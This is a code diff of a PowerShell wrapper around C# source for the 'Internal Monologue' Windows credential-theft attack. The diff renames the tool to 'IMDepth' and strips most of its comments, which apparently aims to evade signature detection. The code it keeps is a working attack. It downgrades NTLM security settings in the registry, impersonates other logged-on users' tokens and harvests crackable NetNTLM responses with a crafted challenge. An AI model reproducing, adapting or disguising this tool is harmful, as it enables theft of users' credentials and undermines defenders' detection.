@@ -17,7 +17,7 @@ Param(
 	$Restore
 )
 
-# Invert flags so that options run by default; Switches are used to disable a feature
+
 if ($Downgrade){$Downgrade = $False} Else {$Downgrade = $True}
 if ($Impersonate){$Impersonate = $False} Else {$Impersonate = $True}
 if ($Restore){$Restore = $False} Else {$Restore = $True}
@@ -34,7 +34,7 @@ using System.Collections.Generic;
 using System.Diagnostics;
 using System.Text.RegularExpressions;
 
-namespace InternalMonologue
+namespace IMDepth
 {
     public class Program
     {
@@ -196,7 +196,7 @@ namespace InternalMonologue
             SetRegKey("SYSTEM\\CurrentControlSet\\Control\\Lsa\\MSV1_0", "RestrictSendingNTLMTraffic", oldValue_RestrictSendingNTLMTraffic);
         }
 
-        //Retrieves the SID of a given token
+        
         public static string GetLogonId(IntPtr token)
         {
             string SID = null;
@@ -237,11 +237,11 @@ namespace InternalMonologue
 
                 if (OpenProcessToken(process.Handle, 0x0008, ref token))
                 {
-                    //Get the SID of the token
+                    
                     SID = GetLogonId(token);
                     CloseHandle(token);
 
-                    //Check if this user hasn't been handled yet
+                    
                     if (SID != null && authenticatedUsers.Contains(SID) == false)
                     {
                         if (OpenProcessToken(process.Handle, 0x0002, ref token))
@@ -264,8 +264,8 @@ namespace InternalMonologue
                                 using (WindowsImpersonationContext impersonatedUser = WindowsIdentity.Impersonate(dupToken))
                                 {
                                     if (verbose == true) Console.WriteLine("Impersonated user " + WindowsIdentity.GetCurrent().Name);
-                                    string result = InternalMonologueForCurrentUser(challenge);
-                                    //Ensure it is a valid response and not blank
+                                    string result = IMDepthForCurrentUser(challenge);
+                                 
                                     if (result != null && result.Length > 0)
                                     {
                                         Console.WriteLine(result);
@@ -275,7 +275,7 @@ namespace InternalMonologue
                                 }
                             }
                             catch
-                            { /*Does not need to do anything if it fails*/ }
+                            { /* */ }
                             finally
                             {
                                 CloseHandle(dupToken);
@@ -334,8 +334,8 @@ namespace InternalMonologue
                                 using (WindowsImpersonationContext impersonatedUser = WindowsIdentity.Impersonate(dupToken))
                                 {
                                     if (verbose == true) Console.WriteLine("Impersonated user " + WindowsIdentity.GetCurrent().Name);
-                                    string result = InternalMonologueForCurrentUser(challenge);
-                                    //Ensure it is a valid response and not blank
+                                    string result = IMDepthForCurrentUser(challenge);
+                 
                                     if (result != null && result.Length > 0)
                                     {
                                         Console.WriteLine(result);
@@ -345,7 +345,7 @@ namespace InternalMonologue
                                 }
                             }
                             catch 
-                            { /*Does not need to do anything if it fails*/ }
+                            { /* */ }
                             finally
                             {
                                 CloseHandle(dupToken);
@@ -355,13 +355,13 @@ namespace InternalMonologue
                 }
             }
             catch (Exception)
-            { /*Does not need to do anything if it fails*/ }
+            { /* */ }
         }
 
-        //Maintains a list of handled users
+        
         static List<string> authenticatedUsers = new List<string>();
 
-        //Parse command line arguments
+        
         static Dictionary<string, string> ParseArgs(string[] args)
         {
             Dictionary<string, string> ret = new Dictionary<string, string>();
@@ -386,9 +386,9 @@ namespace InternalMonologue
         {
             Console.WriteLine();
             Console.WriteLine("Usage:");
-            Console.WriteLine("InternalMonologue -Downgrade True/False -Restore True/False - Impersonate True/False -Verbose True/False -Challenge ascii-hex");
+            Console.WriteLine("IMDepth -Downgrade True/False -Restore True/False - Impersonate True/False -Verbose True/False -Challenge ascii-hex");
             Console.WriteLine("Example:");
-            Console.WriteLine("InternalMonologue -Downgrade False -Restore False -Impersonate True -Verbose False -Challenge 1122334455667788");
+            Console.WriteLine("IMDepth -Downgrade False -Restore False -Impersonate True -Verbose False -Challenge 1122334455667788");
             Console.WriteLine();
             Console.WriteLine("Downgrade - Specifies whether to perform an NTLM downgrade or not [True/False]. Optional. Defult is true.");
             Console.WriteLine("Restore - Specifies whether to restore the original values from before the NTLM downgrade or not [True/False]. Optional. Defult is true.");
@@ -401,7 +401,7 @@ namespace InternalMonologue
         public static void Main(string[] args)
         {
             Dictionary<string, string> argDict = ParseArgs(args);
-            //Set defaults
+        
             bool impersonate = true, downgrade = true, restore = true, verbose = false;
             string challenge = "1122334455667788";
 
@@ -462,7 +462,7 @@ namespace InternalMonologue
             {
                 authenticatedUsers.Clear();
             }
-            //Extended NetNTLM Downgrade and impersonation can only work if the current process is elevated
+        
             if (IsElevated())
             {
                 if (verbose == true) Console.WriteLine("Running elevated");
@@ -472,7 +472,7 @@ namespace InternalMonologue
                 if (downgrade == true)
                 {
                     if (verbose == true) Console.WriteLine("Performing NTLM Downgrade");
-                    //Perform an Extended NetNTLM Downgrade and store the current values to restore them later
+        
                     ExtendedNTLMDowngrade(out oldValue_LMCompatibilityLevel, out oldValue_NtlmMinClientSec, out oldValue_RestrictSendingNTLMTraffic);
                 }
 
@@ -494,26 +494,26 @@ namespace InternalMonologue
                 else
                 {
                     if (verbose == true) Console.WriteLine("Performing attack on current user only (no impersonation)");
-                    Console.WriteLine(InternalMonologueForCurrentUser(challenge));
+                    Console.WriteLine(IMDepthForCurrentUser(challenge));
                 }
 
                 if (downgrade == true && restore == true)
                 {
                     if (verbose == true) Console.WriteLine("Restoring NTLM values");
-                    //Undo changes made in the Extended NetNTLM Downgrade
+        
                     NTLMRestore(oldValue_LMCompatibilityLevel, oldValue_NtlmMinClientSec, oldValue_RestrictSendingNTLMTraffic);
                 }
             }
             else
             {
-                //If the process is not elevated, skip downgrade and impersonation and only perform an Internal Monologue Attack for the current user
+        
                 if (verbose == true) Console.WriteLine("Not elevated. Performing attack with current NTLM settings on current user");
-                Console.WriteLine(InternalMonologueForCurrentUser(challenge));
+                Console.WriteLine(IMDepthForCurrentUser(challenge));
             }
         }
 
-        //This function performs an Internal Monologue Attack in the context of the current user and returns the NetNTLM response for the challenge 0x1122334455667788
-        private static string InternalMonologueForCurrentUser(string challenge)
+        
+        private static string IMDepthForCurrentUser(string challenge)
         {
             SecBufferDesc ClientToken = new SecBufferDesc(MAX_TOKEN_SIZE);
 
@@ -525,7 +525,7 @@ namespace InternalMonologue
             SECURITY_HANDLE _hClientContext;
             uint ContextAttributes = 0;
 
-            // Acquire credentials handle for current user
+        
             AcquireCredentialsHandle(
                 WindowsIdentity.GetCurrent().Name,
                 "NTLM",
@@ -538,7 +538,7 @@ namespace InternalMonologue
                 ref ClientLifeTime
                 );
 
-            // Get a type-1 message from NTLM SSP
+        
             InitializeSecurityContext(
                 ref _hOutboundCred,
                 IntPtr.Zero,
@@ -557,7 +557,7 @@ namespace InternalMonologue
 
             ClientToken = new SecBufferDesc(MAX_TOKEN_SIZE);
 
-            // Custom made type-2 message with the specified challenge
+        
             byte[] challengeBytes = StringToByteArray(challenge);
             SecBufferDesc ServerToken = new SecBufferDesc(new byte[] { 78, 84, 76, 77, 83, 83, 80, 0, 2, 0, 0, 0, 0, 0, 0, 0, 40, 0, 0, 0, 1, 0x82, 0, 0, challengeBytes[0], challengeBytes[1], challengeBytes[2], challengeBytes[3], challengeBytes[4], challengeBytes[5], challengeBytes[6], challengeBytes[7], 0, 0, 0, 0, 0, 0, 0 });
             InitializeSecurityContext(
@@ -583,7 +583,7 @@ namespace InternalMonologue
             return ParseNTResponse(result, challenge);
         }
 
-        //This function parses the NetNTLM response from a type-3 message
+        
         private static string ParseNTResponse(byte[] message, string challenge)
         {
             ushort lm_resp_len = BitConverter.ToUInt16(message, 12);
@@ -616,7 +616,7 @@ namespace InternalMonologue
             return result;
         }
 
-        //The following function is taken from https://stackoverflow.com/questions/311165/how-do-you-convert-a-byte-array-to-a-hexadecimal-string-and-vice-versa
+        
         private static string ByteArrayToString(byte[] ba)
         {
             StringBuilder hex = new StringBuilder(ba.Length * 2);
@@ -625,13 +625,13 @@ namespace InternalMonologue
             return hex.ToString();
         }
 
-        //This function is taken from https://stackoverflow.com/questions/3600322/check-if-the-current-user-is-administrator
+        
         private static bool IsElevated()
         {
             return (new WindowsPrincipal(WindowsIdentity.GetCurrent())).IsInRole(WindowsBuiltInRole.Administrator);
         }
 
-        //This function is taken from https://stackoverflow.com/questions/321370/how-can-i-convert-a-hex-string-to-a-byte-array
+        
         public static byte[] StringToByteArray(string hex)
         {
             if (hex.Length % 2 == 1)
@@ -647,14 +647,14 @@ namespace InternalMonologue
             return arr;
         }
 
-        //This function is taken from https://stackoverflow.com/questions/321370/how-can-i-convert-a-hex-string-to-a-byte-array
+        
         public static int GetHexVal(char hex)
         {
             int val = (int)hex;
             return val - (val < 58 ? 48 : 55);
         }
 
-        //This function is taken from https://stackoverflow.com/questions/5613279/c-sharp-hex-to-ascii
+        
         public static string ConvertHex(String hexString)
         {
             string ascii = string.Empty;
@@ -847,14 +847,12 @@ $inmem.ReferencedAssemblies.AddRange($(@("System.dll", $([PSObject].Assembly.Loc
 
 Add-Type -TypeDefinition $Source -Language CSharp -CompilerParameters $inmem
 
-# Setting a custom stdout to capture Console.WriteLine output
-# https://stackoverflow.com/questions/33111014/redirecting-output-from-an-external-dll-in-powershell
 $OldConsoleOut = [Console]::Out
 $StringWriter = New-Object IO.StringWriter
 [Console]::SetOut($StringWriter)
 
 # Space needed in front of dictionary key name
-[InternalMonologue.Program]::Main(@(" challenge",$Challenge," downgrade",$Downgrade," impersonate",$Impersonate," restore",$Restore," verbose",$v))
+[IMDepth.Program]::Main(@(" challenge",$Challenge," downgrade",$Downgrade," impersonate",$Impersonate," restore",$Restore," verbose",$v))
 
 # Restore the regular STDOUT object
 [Console]::SetOut($OldConsoleOut)
